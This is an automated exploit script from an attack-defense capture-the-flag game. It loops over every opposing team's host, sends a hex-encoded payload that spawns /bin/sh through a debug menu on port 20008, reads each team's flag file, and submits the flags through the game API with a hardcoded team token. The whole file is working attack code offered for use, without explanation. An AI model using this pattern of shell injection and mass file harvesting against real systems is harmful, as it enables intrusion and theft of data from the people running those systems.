import base64
import socks
import socket
import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time

def hostToIP(host):
   num = int(host.replace("team",""))
   part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
   return "172.31."+part

def runJob(team):
   SHELLCODE = '54455854206D61696EC2B7637573746F6D285342292C24300A0A202020204D4F5651202435392C2041580A202020204D4F56442024307836453639363232462C2042580A202020204D4F56442042582C2030285350290A202020204D4F56442024307830303638373332462C2042580A202020204D4F56442042582C2034285350290A202020204D4F56512053502C2042580A202020204D4F56512042582C2038285350290A202020204D4F56512024302C203136285350290A202020204C454151203136285350292C2042580A202020204D4F56512042582C203234285350290A202020204D4F56512053502C2044490A202020204C4541512038285350292C2053490A202020204D4F5651203136285350292C2044580A2020202053595343414C4C0A202020205245540A0A454F460A'

   SHELLCODE = base64.b16decode(SHELLCODE)

   try:
      r = remote(hostToIP(team['hostname']), 20008, timeout=0.05)
   except socks.GeneralProxyError:
      return False

   r.recvuntil("Debug interface")
   r.sendline("6")
   r.recvuntil("Submit stub")
   r.sendline(SHELLCODE)
   r.sendline("cat %s_flag.txt\nexit" % team['flag_id'])
   time.sleep(0.5)
   data = r.recvuntil("DONE")
   print data
   try:
      flag = data.split("\n")[1]
   except IndexError:
      return False



   r.close()

   print flag
   return flag

def fakeJob(team):
   return True

if __name__ == "__main__":
   print "Starting"
   context.proxy=(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4446)
   socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4446)
   socket.socket = socks.socksocket
   while(1):
      t = Team(None, "muVraUlLU7m0MM9dmg4P4auy59t5PFdg")
      targets = t.get_targets("brave_rust")
      for target in targets:
         flag = runJob(target)
         if (flag):
            t.submit_flag([flag])
      print "Waiting for next round plz"
      time.sleep(60)